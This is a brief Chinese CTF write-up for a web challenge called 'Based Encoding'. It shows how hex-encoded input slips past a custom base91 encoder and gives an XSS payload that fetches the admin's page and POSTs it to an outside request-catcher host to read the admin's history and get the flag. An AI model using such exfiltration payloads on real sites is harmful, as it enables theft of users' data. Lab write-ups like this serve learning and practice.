# web
### Based Encoding
#xss 
用户的输入会进行一个自己写的base91算法编码然后回显
思路,`decode("<script>alert(1)</script>")`
但是发现存在不可见字符传参传不进去,但是代码里允许16进制传参,

```js
print(decode('<script>alert(1)</script>').hex())
//成功弹窗
```

但是需要读取admin的编码历史,需要用到一些base91码表里没有的值,比如`.`
```js
<script>
fetch("/")
	.then(x=>x.text())
		.then(x=>fetch("http://example.com",{
			method:"post",
			body:x		
		}))
</script>
```

```html
<script>
fetch("/")
    .then(x => x.text())
    .then(x => fetch("https://nice.requestcatcher.com/test", {
        method: "post",
        body: x
    }))
</script>aaa <!--防止base91解码后丢失数据>
```

接收到admin的页面截图
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018202947.png)
直接访问即可得到flag

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-10-18   15:52